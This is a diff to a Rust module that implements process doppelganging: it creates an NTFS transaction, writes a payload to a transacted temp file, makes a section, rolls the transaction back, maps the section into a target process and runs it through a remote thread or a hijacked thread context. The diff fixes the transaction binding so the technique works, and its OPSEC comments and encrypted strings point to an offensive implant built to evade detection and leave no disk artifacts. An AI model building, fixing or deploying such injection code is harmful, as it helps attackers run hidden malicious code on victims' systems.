@@ -8,7 +8,7 @@
 //!
 //! 1. Create an NTFS transaction via `NtCreateTransaction`.
 //! 2. Create a temporary file **within** the transaction via `NtCreateFile`
-//!    (with the transaction handle as `RootDirectory` in `OBJECT_ATTRIBUTES`).
+//!    (with the transaction bound via `RtlSetCurrentTransaction`).
 //! 3. Write the payload to the transacted file via `NtWriteFile`.
 //! 4. Create a section backed by the transacted file via `NtCreateSection`.
 //! 5. **Roll back the transaction** via `NtRollbackTransaction` — the temp file
@@ -204,9 +204,12 @@ pub struct DoppelgangingResult {
 
 // ── Page alignment helper ────────────────────────────────────────────────────
 
+/// Align `size` up to the next page boundary using the runtime page size.
+///
+/// Delegates to [`crate::page_size::page_align`] which queries
+/// `GetSystemInfo` on first call and caches the result.
 fn page_align(size: usize) -> usize {
-    let page = 4096;
-    ((size + page - 1) / page) * page
+    crate::page_size::page_align(size)
 }
 
 // ── Transaction helpers ──────────────────────────────────────────────────────
@@ -226,14 +229,14 @@ unsafe fn create_transaction() -> Result<usize, String> {
     let nt_result = try_nt_create_transaction();
     match nt_result {
         Ok(handle) => {
-            log::debug!(
+            tracing::debug!(
                 "injection_doppelganging: NtCreateTransaction succeeded, handle={:#x}",
                 handle
             );
             return Ok(handle);
         }
         Err(reason) => {
-            log::debug!(
+            tracing::debug!(
                 "injection_doppelganging: NtCreateTransaction failed ({}), trying ntdll fallback",
                 reason
             );
@@ -258,7 +261,7 @@ unsafe fn create_transaction() -> Result<usize, String> {
                 std::ptr::null_mut(), // dwDescription = NULL
             );
             if ret != 0 && tx_handle != 0 {
-                log::debug!(
+                tracing::debug!(
                     "injection_doppelganging: RtlCreateTransaction fallback succeeded, handle={:#x}",
                     tx_handle
                 );
@@ -326,10 +329,10 @@ unsafe fn rollback_transaction(tx_handle: usize) -> Result<(), String> {
             ],
         );
         if status >= 0 {
-            log::debug!("injection_doppelganging: NtRollbackTransaction succeeded");
+            tracing::debug!("injection_doppelganging: NtRollbackTransaction succeeded");
             return Ok(());
         }
-        log::debug!(
+        tracing::debug!(
             "injection_doppelganging: NtRollbackTransaction failed ({:#x}), trying fallback",
             status as u32
         );
@@ -343,7 +346,7 @@ unsafe fn rollback_transaction(tx_handle: usize) -> Result<(), String> {
             let func: extern "system" fn(usize, i32) -> i32 = std::mem::transmute(addr);
             let status = func(tx_handle, 1);
             if status >= 0 {
-                log::debug!("injection_doppelganging: RtlRollbackTransaction succeeded");
+                tracing::debug!("injection_doppelganging: RtlRollbackTransaction succeeded");
                 return Ok(());
             }
         }
@@ -357,7 +360,7 @@ unsafe fn rollback_transaction(tx_handle: usize) -> Result<(), String> {
             let func: extern "system" fn(usize) -> i32 = std::mem::transmute(addr);
             let ret = func(tx_handle);
             if ret != 0 {
-                log::debug!("injection_doppelganging: kernel32 RollbackTransaction succeeded");
+                tracing::debug!("injection_doppelganging: kernel32 RollbackTransaction succeeded");
                 return Ok(());
             }
         }
@@ -370,9 +373,9 @@ unsafe fn rollback_transaction(tx_handle: usize) -> Result<(), String> {
 
 /// Create a temporary file within an NTFS transaction.
 ///
-/// Builds an NT path (`\??\C:\Windows\Temp\~dpgXXXX.tmp`) and sets
-/// `OBJECT_ATTRIBUTES.RootDirectory = tx_handle` to associate the file with
-/// the transaction.
+/// Builds an NT path (`\??\C:\Windows\Temp\~dpgXXXX.tmp`) and binds the
+/// transaction to the current thread via `RtlSetCurrentTransaction` before
+/// calling `NtCreateFile`, then clears the transaction context afterwards.
 ///
 /// # OPSEC
 ///
@@ -382,7 +385,15 @@ unsafe fn rollback_transaction(tx_handle: usize) -> Result<(), String> {
 unsafe fn create_transacted_file(tx_handle: usize, payload_size: usize) -> Result<usize, String> {
     let aligned_size = page_align(payload_size);
 
-    // ── Build temp file NT path ──────────────────────────────────────
+    // ── Step 1: Bind transaction to current thread ───────────────────
+    // This enlists all subsequent file I/O on this thread into the
+    // transaction.  The correct NT mechanism — do NOT place the tx handle
+    // in OBJECT_ATTRIBUTES.RootDirectory (that is a directory handle field).
+    crate::injection_transacted::set_current_transaction(tx_handle).map_err(|e| {
+        format!("set_current_transaction failed: {}", e)
+    })?;
+
+    // ── Step 2: Build temp file NT path ──────────────────────────────
     // Path: \??\C:\Windows\Temp\~dpgXXXX.tmp  (randomised suffix)
     let base_path =
         String::from_utf8_lossy(&string_crypt::enc_str!("\\??\\C:\\Windows\\Temp\\~dpg"))
@@ -402,18 +413,18 @@ unsafe fn create_transacted_file(tx_handle: usize, payload_size: usize) -> Resul
         buffer: full_path.as_ptr() as usize,
     };
 
-    // Build OBJECT_ATTRIBUTES with RootDirectory = tx_handle.
-    // This is the key to associating the file with the transaction.
+    // Build OBJECT_ATTRIBUTES — RootDirectory is 0 (no directory handle).
+    // The transaction binding is done via the thread's KTM context, not here.
     let mut oa = NtObjAttr {
         length: std::mem::size_of::<NtObjAttr>() as u32,
-        root_directory: tx_handle,
+        root_directory: 0,
         object_name: &mut uni_name as *mut _ as usize,
         attributes: OBJ_CASE_INSENSITIVE,
         security_descriptor: 0,
         security_quality_of_service: 0,
     };
 
-    // ── Create the temp file within the transaction ──────────────────
+    // ── Step 3: Create the temp file within the transaction ──────────
     let mut file_handle: usize = 0;
     let mut iosb = NtIoStatusBlock {
         status: 0,
@@ -439,18 +450,19 @@ unsafe fn create_transacted_file(tx_handle: usize, payload_size: usize) -> Resul
     );
 
     if create_file_status.as_ref().map_or(true, |s| *s < 0) || file_handle == 0 {
+        let _ = crate::injection_transacted::set_current_transaction(0);
         return Err(format!(
             "NtCreateFile for transacted temp file failed: status={:?}",
             create_file_status
         ));
     }
 
-    log::debug!(
+    tracing::debug!(
         "injection_doppelganging: created transacted temp file handle={:#x}",
         file_handle
     );
 
-    // ── Write placeholder data to the file ───────────────────────────
+    // ── Step 4: Write placeholder data to the file ───────────────────
     // The file needs to be at least `aligned_size` so the section can map it.
     let zero_buf = vec![0u8; aligned_size];
     let mut iosb2 = NtIoStatusBlock {
@@ -471,6 +483,10 @@ unsafe fn create_transacted_file(tx_handle: usize, payload_size: usize) -> Resul
         0u64,                        // Key = NULL
     );
 
+    // ── Step 5: Clear the thread's transaction context ───────────────
+    // All transacted file I/O for this file is complete.
+    let _ = crate::injection_transacted::set_current_transaction(0);
+
     if write_status.as_ref().map_or(true, |s| *s < 0) {
         let _ = crate::syscall!("NtClose", file_handle as u64);
         return Err(format!(
@@ -479,7 +495,7 @@ unsafe fn create_transacted_file(tx_handle: usize, payload_size: usize) -> Resul
         ));
     }
 
-    log::debug!(
+    tracing::debug!(
         "injection_doppelganging: wrote {} placeholder bytes to transacted file",
         aligned_size
     );
@@ -522,7 +538,7 @@ unsafe fn write_payload_to_file(file_handle: usize, payload: &[u8]) -> Result<()
         ));
     }
 
-    log::debug!(
+    tracing::debug!(
         "injection_doppelganging: wrote {} payload bytes to transacted file",
         payload.len()
     );
@@ -567,7 +583,7 @@ unsafe fn create_section_from_file(
         ));
     }
 
-    log::debug!(
+    tracing::debug!(
         "injection_doppelganging: created section handle={:#x}, size={}",
         h_section,
         aligned_size
@@ -607,7 +623,7 @@ unsafe fn write_payload_to_section(h_section: usize, payload: &[u8]) -> Result<(
     // Unmap from our process — the section object retains the data.
     let _ = crate::syscall!("NtUnmapViewOfSection", CURRENT_PROCESS, local_base as u64,);
 
-    log::debug!(
+    tracing::debug!(
         "injection_doppelganging: wrote {} bytes to section",
         payload.len()
     );
@@ -649,7 +665,7 @@ unsafe fn map_section_to_process(
         ));
     }
 
-    log::debug!(
+    tracing::debug!(
         "injection_doppelganging: mapped section into target at {:#x}",
         remote_base as usize
     );
@@ -761,7 +777,7 @@ unsafe fn open_target_process(pid: u32) -> Result<usize, String> {
         ));
     }
 
-    log::debug!(
+    tracing::debug!(
         "injection_doppelganging: opened target process pid={}, handle={:#x}",
         pid,
         h_proc
@@ -835,7 +851,7 @@ unsafe fn create_suspended_process() -> Result<(usize, usize, u32), String> {
     let process_handle = proc_info.h_process as usize;
     let thread_handle = proc_info.h_thread as usize;
 
-    log::debug!(
+    tracing::debug!(
         "injection_doppelganging: created suspended process pid={}",
         pid
     );
@@ -883,7 +899,7 @@ unsafe fn execute_payload(process_handle: usize, entry_point: usize) -> Result<u
         return Err(format!("NtCreateThreadEx failed: status={:?}", status));
     }
 
-    log::debug!(
+    tracing::debug!(
         "injection_doppelganging: created remote thread handle={:#x} at entry={:#x}",
         thread_handle,
         entry_point
@@ -899,7 +915,7 @@ unsafe fn execute_payload(process_handle: usize, entry_point: usize) -> Result<u
 ///
 /// P2-37: Uses `crate::win_types::CONTEXT`, a local `#[repr(C)]` struct
 /// matching the Windows x86_64 CONTEXT layout.  No winapi dependency —
-/// avoids pulling winapi::um::winnt::CONTEXT which would create linker
+/// avoids pulling crate::win_types::CONTEXT which would create linker
 /// dependencies on the winapi crate's advapi32/kernel32 stubs.
 unsafe fn redirect_thread(thread_handle: usize, payload_addr: usize) -> Result<(), String> {
     use crate::win_types::CONTEXT;
@@ -929,7 +945,7 @@ unsafe fn redirect_thread(thread_handle: usize, payload_addr: usize) -> Result<(
         return Err(format!("NtSetContextThread failed: status={:?}", status));
     }
 
-    log::debug!(
+    tracing::debug!(
         "injection_doppelganging: redirected thread RIP to {:#x}",
         payload_addr
     );
@@ -982,7 +998,7 @@ pub unsafe fn doppelganging_inject(
     payload: &[u8],
     target_process: Option<&str>,
 ) -> Result<DoppelgangingResult, String> {
-    log::info!(
+    tracing::info!(
         "injection_doppelganging: starting with payload size={}",
         payload.len()
     );
@@ -991,7 +1007,7 @@ pub unsafe fn doppelganging_inject(
     // The transaction wraps all file operations so they can be rolled back.
     let tx_handle = create_transaction()?;
 
-    log::debug!(
+    tracing::debug!(
         "injection_doppelganging: transaction created, handle={:#x}",
         tx_handle
     );
@@ -1030,10 +1046,10 @@ pub unsafe fn doppelganging_inject(
     // OPSEC value: **no disk artifacts remain**.
     match rollback_transaction(tx_handle) {
         Ok(()) => {
-            log::info!("injection_doppelganging: transaction rolled back — no disk artifacts");
+            tracing::info!("injection_doppelganging: transaction rolled back — no disk artifacts");
         }
         Err(e) => {
-            log::warn!(
+            tracing::warn!(
                 "injection_doppelganging: transaction rollback failed (non-fatal, payload already in section): {}",
                 e
             );
@@ -1063,7 +1079,7 @@ pub unsafe fn doppelganging_inject(
         }
     };
 
-    log::info!(
+    tracing::info!(
         "injection_doppelganging: target process pid={}, handle={:#x}, suspended={}",
         pid,
         process_handle,
@@ -1086,7 +1102,7 @@ pub unsafe fn doppelganging_inject(
             e
         })?;
 
-    log::debug!(
+    tracing::debug!(
         "injection_doppelganging: payload mapped at {:#x} in target pid={}",
         remote_base,
         pid
@@ -1108,13 +1124,13 @@ pub unsafe fn doppelganging_inject(
         );
         match flush_status {
             Ok(s) if s < 0 => {
-                log::warn!(
+                tracing::warn!(
                     "injection_doppelganging: NtFlushInstructionCache returned 0x{:08X} (non-fatal on x64)",
                     s as u32
                 );
             }
             Err(_) => {
-                log::debug!(
+                tracing::debug!(
                     "injection_doppelganging: NtFlushInstructionCache syscall not available"
                 );
             }
@@ -1136,7 +1152,7 @@ pub unsafe fn doppelganging_inject(
         execute_payload(process_handle, remote_base)?
     };
 
-    log::info!(
+    tracing::info!(
         "injection_doppelganging: injection complete — pid={}, base={:#x}",
         pid,
         remote_base
@@ -1157,9 +1173,10 @@ mod tests {
 
     #[test]
     fn test_page_align() {
+        let ps = crate::page_size::system_page_size();
         assert_eq!(page_align(0), 0);
-        assert_eq!(page_align(1), 4096);
-        assert_eq!(page_align(4096), 4096);
-        assert_eq!(page_align(4097), 8192);
+        assert_eq!(page_align(1), ps);
+        assert_eq!(page_align(ps), ps);
+        assert_eq!(page_align(ps + 1), ps * 2);
     }
 }
